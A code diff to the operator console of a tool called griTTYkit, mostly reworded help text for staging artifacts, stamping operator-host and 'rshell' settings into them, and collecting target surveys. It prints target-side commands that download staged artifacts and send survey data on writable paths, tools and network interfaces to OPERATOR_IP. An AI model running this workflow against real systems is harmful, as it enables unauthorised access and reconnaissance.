@@ -20,9 +20,17 @@ from gritlib.profiles import (
     profile_summary_line,
     upsert_profile_from_probe,
 )
+from gritlib.line_release import (
+    print_release_selector_examples,
+    release_selector_examples_are_placeholders,
+    release_selector_example_label,
+    release_selector_example_lines,
+)
+from gritlib.release_contexts import release_context
 from gritlib.session_state import read_json_file
 from gritlib.shell_utils import shquote
 from gritlib.file_transfers import render_fetch_command
+from gritlib.line_probe_guidance import print_probe_menu_steps
 from gritlib.session_state import atomic_write_json, utc_now
 from gritlib.staged_files import (
     file_sha256,
@@ -347,7 +355,7 @@ def print_line_artifacts(cfg):
             "source": rec.get("configured_source_path") or rec.get("source_path") or "",
         })
     release_dir = str(cfg.get("release_dir") or "")
-    print(f"Artifact workspace  ({len(records)} staged)")
+    print(f"Artifact files  ({len(records)} staged)")
     print(f"  release dir: {release_dir or '(not set)'}")
     if records:
         console_table(
@@ -361,13 +369,81 @@ def print_line_artifacts(cfg):
             ],
         )
     else:
-        print("  staged: none")
+        print("  staged: no artifacts yet")
     print("  next:")
-    print("    artifact info N")
-    print("    artifact info NAME")
-    print("    artifact info PATH")
-    print("    artifact show NAME")
-    print("    release")
+    if records:
+        first = records[0]
+        name = first.get("name") or "grit"
+        num = first.get("num") or "1"
+        print(f"    artifact info {num}")
+        print(f"    artifact info {name}")
+        print(f"    artifact show {name}")
+    else:
+        print("    release")
+        profile = active_profile(cfg)
+        rel = release_context(cfg)
+        examples = release_selector_example_lines(rel, include_tuple=bool(profile))
+        examples_are_placeholders = release_selector_examples_are_placeholders(examples)
+        if examples and not examples_are_placeholders:
+            print(f"    {examples[0]}  ({release_selector_example_label(examples[0])})")
+        elif rel:
+            print("    No stageable release artifacts found in this release.")
+        print("    release ?  (staging help)")
+        if not profile:
+            print("    profiles ?  (profile setup)")
+            print_probe_menu_steps("    ")
+            print("    profile create lab-router  (create profile manually)")
+        if examples[1:] and not examples_are_placeholders:
+            print("    other staging choices:")
+            for example in examples[1:]:
+                print(f"      {example}  ({release_selector_example_label(example)})")
+        if not profile and examples and not examples_are_placeholders:
+            print("    More target-matched staging choices appear after a profile has probe or device details.")
+    print("    artifact info ./grit  (inspect a local file directly)")
+
+
+def print_artifact_context_help(records=None, cfg=None):
+    records = list(records or [])
+    print("Artifact")
+    print("  artifact                       show staged artifacts and current release directory")
+    print("  artifact info ./grit           show embedded runtime settings for a local path")
+    print("  stamp ./grit operator-host 192.168.8.241")
+    print("                                 stamp embedded runtime settings into a local artifact path")
+    print("  artifact stamp ./grit transport builtin")
+    print("                                 stamp embedded runtime settings by path")
+    print("  artifact show ./grit           show stamped runtime settings by path")
+    print("  artifact clear ./grit          clear stamped runtime settings by path")
+    if records:
+        print("  artifact info grit             show embedded runtime settings for a staged artifact")
+        print("  artifact info 1                show embedded runtime settings by row number")
+        print("  stamp grit operator-host 192.168.8.241")
+        print("                                 stamp embedded runtime settings into a staged file or artifact")
+        print("  stamp grit show                show current stamped runtime settings")
+        print("  stamp grit clear               remove stamped runtime settings")
+        print("  artifact stamp grit transport builtin")
+        print("                                 stamp embedded runtime settings")
+        print("  artifact show grit             show stamped runtime settings")
+        print("  artifact clear grit            clear stamped runtime settings")
+    else:
+        print("")
+        print("No staged artifacts yet.")
+        has_profile = bool(cfg and active_profile(cfg))
+        if has_profile:
+            print("Open release and use the staging choices below to stage an artifact.")
+        else:
+            print("Open release for profile-aware staging steps.")
+            print("No active profile yet; run profiles ? for profile setup.")
+            rel = release_context(cfg) if cfg else None
+            has_release_choices = bool(release_selector_example_lines(rel, include_tuple=False))
+            if has_release_choices:
+                print("Known device or artifact path: use one of the staging choices below.")
+        print("You can also inspect a local file directly with artifact info ./grit.")
+        has_choices = print_release_selector_examples(rel, include_tuple=has_profile)
+        if not has_profile and has_choices:
+            print("  More target-matched staging choices appear after a profile has probe or device details.")
+    print("")
+    print("Artifact commands inspect or stamp local files; they do not run anything on the target.")
+    print("Use `files` or `deliver sample-file` when you want commands to run on the target for staged files.")
 
 
 def print_line_artifact_info(cfg, args):
@@ -385,12 +461,31 @@ def print_line_artifact_info(cfg, args):
     print(f"  path: {path}")
     helper = inspect_artifact_script()
     result = subprocess.run([str(helper), str(path)], cwd=Path(__file__).resolve().parent.parent, text=True, capture_output=True)
+    combined_output = (result.stdout or "") + (result.stderr or "")
+    missing_config_markers = (
+        "embedded payload trailer missing",
+        "artifact too small",
+    )
+    if result.returncode != 0 and any(marker in combined_output.lower() for marker in missing_config_markers):
+        print("  embedded runtime settings: not stamped yet")
+        stamp_selector = shquote(request_name) if request_name else shquote(str(path))
+        operator_host = shquote(str(
+            cfg.get("GRIT_OPERATOR_SERVER_HOST")
+            or cfg.get("listen_host")
+            or "127.0.0.1"
+        ))
+        print("  common stamp examples:")
+        print(f"    stamp {stamp_selector} operator-host {operator_host} transport ssh")
+        print(f"    stamp {stamp_selector} zero-arg-mode rshell")
+        print(f"    artifact stamp {stamp_selector} operator-host {operator_host} transport ssh")
+        print(f"  choose operator host: ip, ip host 1, or ip host {operator_host}")
+        return path
     if result.stdout:
         print(result.stdout, end="")
     if result.stderr:
         print(result.stderr, end="")
     if result.returncode != 0:
-        raise ValueError(f"inspect-artifact exited {result.returncode}")
+        raise ValueError(f"artifact inspection failed (inspect-artifact exited {result.returncode})")
     return path
 
 
@@ -468,7 +563,8 @@ def configure_line_artifact(cfg, args, append_event_fn=None):
     print(f"  artifact: {artifact}")
     if request_name:
         print(f"  name: {request_name}")
-        print(f"  target command: {fetch_command}")
+        print(f"  run on target: {fetch_command}")
+        print("  direction: run this on the target to download the staged artifact from the operator")
     if kv:
         print("  keys: " + ", ".join(item.split("=", 1)[0] for item in kv))
     headless = " ".join(shquote(part) for part in cmd)
@@ -554,7 +650,8 @@ def finish_line_config_run(cfg, write_config_path, event_details, append_event_f
         print("  reload  — apply it now without restarting")
     else:
         build_cfg = str(build_config_path(cfg))
-        print(f"\n  To write: {event_details.get('cmd_name', 'config')} write-config {shquote(build_cfg)}")
+        display_cmd_name = event_details.get("display_cmd_name") or event_details.get("cmd_name", "config")
+        print(f"\n  To write: {display_cmd_name} write-config {shquote(build_cfg)}")
         print(
             "  (build config — separate from server config "
             f"{str(cfg.get('_config_path') or DEFAULT_CONFIG)})"
@@ -595,7 +692,7 @@ def run_line_probe_config(cfg, args, append_event_fn=None):
             print("  listener serve ssh start")
             print("")
             print("  Export build config if needed:")
-            print("    listener probe config write-config FILE")
+            print("    config write-config ./grit-probe.conf")
             if append_event_fn:
                 append_event_fn(cfg, "workbench", "workbench_probe_profile_updated", details={
                     "profile": profile.get("name", ""),
@@ -627,6 +724,7 @@ def run_line_probe_config(cfg, args, append_event_fn=None):
                 pass
     finish_line_config_run(cfg, write_config_path, {
         "cmd_name": "listener probe config",
+        "display_cmd_name": "config",
         "survey_path": survey_path,
         "write_config_path": write_config_path or "",
         "exit_code": result.returncode,
@@ -641,12 +739,14 @@ def run_line_survey_config(cfg, args, find_survey_uploads_fn, append_event_fn=No
         uploads = find_survey_uploads_fn()
         if not uploads:
             raise ValueError(
-                "no full survey uploads found\n"
+                "no full survey results found\n"
 "  on target: grit survey retrieve --host OPERATOR_IP --port FILE_SERVICE_PORT\n"
-                "  or use probe data: listener probe config"
+                "  or use probe data:\n"
+                "    use listener probe\n"
+                "    config"
             )
         survey_path = uploads[0].get("stored_path") or ""
-        print(f"Using most recent survey upload: {survey_path}")
+        print(f"Using most recent survey result: {survey_path}")
     if not Path(survey_path).is_file():
         raise ValueError(f"survey file not found: {survey_path}")
     result = run_config_from_survey(survey_path, write_config_path, extra_args)
@@ -727,7 +827,7 @@ def _line_time_text(iso):
 def print_line_survey_status(cfg, append_event_fn=None):
     uploads = find_survey_uploads(cfg)
     console_table(
-        f"Survey uploads  ({len(uploads)} found)",
+        f"Survey results  ({len(uploads)} received)",
         uploads[:8],
         [
             ("File",    lambda r: r.get("filename") or "-"),
@@ -736,6 +836,7 @@ def print_line_survey_status(cfg, append_event_fn=None):
             ("At",      lambda r: _line_time_text(r.get("timestamp"))),
             ("Path",    lambda r: r.get("stored_path") or "-"),
         ],
+        empty_message="No full survey results received yet.",
     )
     print("")
     if uploads:
@@ -743,17 +844,43 @@ def print_line_survey_status(cfg, append_event_fn=None):
         print("  survey config PATH           — generate config from a specific full survey")
         print("  survey preset name NAME      — save a reusable target preset from the latest survey")
         print("  survey preset PATH name NAME — save a reusable target preset from a specific survey")
+        print("  commands                     — list target-side survey retrieval commands")
     else:
-        print("  No full survey uploads yet.")
-        print("  After deploying griTTYkit, run on the target:")
-    if uploads:
-        print("  target-to-operator retrieval command:")
-    print("    grit survey retrieve --host OPERATOR_IP --port FILE_SERVICE_PORT")
-    print("  survey ? for help")
+        print("  1. Start the file receiver: start file-service.")
+        print("  2. Run `commands` to show target commands with current listener addresses.")
+        print("  3. Copy the survey row, usually `copy 2`.")
+        print("  4. Run that command on the target, then return here with `survey`.")
+    print("  help: survey ?")
     if append_event_fn:
         append_event_fn(cfg, "workbench", "workbench_survey_status_viewed", details={
             "upload_count": len(uploads),
         })
+
+
+def print_survey_context_help(cfg):
+    uploads = find_survey_uploads(cfg)
+    print("Help: survey — full griTTYkit survey")
+    print("")
+    print("  survey          show received full survey results")
+    print("  survey results  list received full survey results")
+    print("  commands        list target commands, including survey collection")
+    if uploads:
+        print("  survey config                             generate config from the latest survey result")
+        print("  survey config PATH                        generate config from a specific survey result")
+        print("  survey config PATH write-config FILE      generate and save config")
+        print("  survey preset name NAME                   generate a target preset from the latest result")
+        print("  survey preset PATH name NAME              generate a target preset from a specific result")
+        print("  survey preset PATH name NAME write-local  save preset under local/presets/targets/")
+        print("")
+        print("Survey results are available; run `survey` to see numbered paths.")
+    else:
+        print("")
+        print("No full survey results received yet.")
+        print("1. Start the file receiver: start file-service.")
+        print("2. Run `commands` to show target commands with current listener addresses.")
+        print("3. Copy the survey row, usually `copy 2`.")
+        print("4. Run that command on the target, then return here with `survey`.")
+    print("Full survey captures libc, filesystem layout, writable paths, tools, and network interfaces.")
 
 
 def run_line_survey_preset(cfg, args, find_survey_uploads_fn, append_event_fn=None):
@@ -793,12 +920,12 @@ def run_line_survey_preset(cfg, args, find_survey_uploads_fn, append_event_fn=No
         uploads = find_survey_uploads_fn()
         if not uploads:
             raise ValueError(
-                "no full survey uploads found\n"
+                "no full survey results found\n"
 "  on target: grit survey retrieve --host OPERATOR_IP --port FILE_SERVICE_PORT\n"
                 "  or specify: survey preset PATH name NAME"
             )
         survey_path = uploads[0].get("stored_path") or ""
-        print(f"Using most recent survey upload: {survey_path}")
+        print(f"Using most recent survey result: {survey_path}")
     if not Path(survey_path).is_file():
         raise ValueError(f"survey file not found: {survey_path}")
     if not preset_name:
